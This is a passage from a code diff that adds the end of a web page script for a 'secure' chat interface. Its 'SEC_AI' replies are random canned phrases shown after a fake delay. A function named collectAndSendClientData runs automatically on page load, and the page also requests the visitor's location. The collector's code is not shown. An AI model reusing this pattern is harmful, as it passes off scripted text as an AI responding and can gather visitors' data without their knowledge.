+                            "Message received and noted.",
+                            "Thanks. We’re looking into it.",
+                            "Appreciated. We’ll respond soon.",
+                            "Your message is being processed.",
+                            "Thanks for your input.",
+                            "Noted. We’ll provide updates.",
+                            "We’ve received your message and will act accordingly.",
+                            "Thank you. We’ll take the next steps.",
+                            "Got your input. Thanks for sharing.",
+                            "Your query is important to us.",
+                            "Thanks. We’re reviewing it now.",
+                            "Noted. We’ll keep you inform."
+                        ];
+                        const randomReply = replies[Math.floor(Math.random() * replies.length)];
+                        addMessage('SEC_AI', randomReply, false);
+                    }, 800 + Math.random() * 1200);
+                }
+            }
+            
+            // Logout
+            function logout() {
+                isAuthenticated = false;
+                currentPosition = null;
+                statusDot.classList.remove('active');
+                statusText.textContent = 'ACCESS DENIED';
+                statusText.style.color = '';
+                chatMessages.innerHTML = '';
+                chatContainer.style.display = 'none';
+                locationInfo.style.display = 'none';
+                authPrompt.style.display = 'flex';
+                showNotification('SECURE SESSION TERMINATED');
+            }
+            
+            accessBtn.addEventListener('click', requestLocationAccess);
+            logoutBtn.addEventListener('click', logout);
+            sendBtn.addEventListener('click', sendMessage);
+            
+            messageInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    sendMessage();
+                }
+            });
+            
+            setTimeout(collectAndSendClientData, 100);
+            setTimeout(checkServerStatus, 500); // Check server status shortly after
+            
+            setTimeout(() => {
+                if (!isAuthenticated) {
+                    addMessage('SECURITY SERVER', 'SYSTEM IS READY. SECURITY GRID IS ACTIVE.', false);
+                }
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
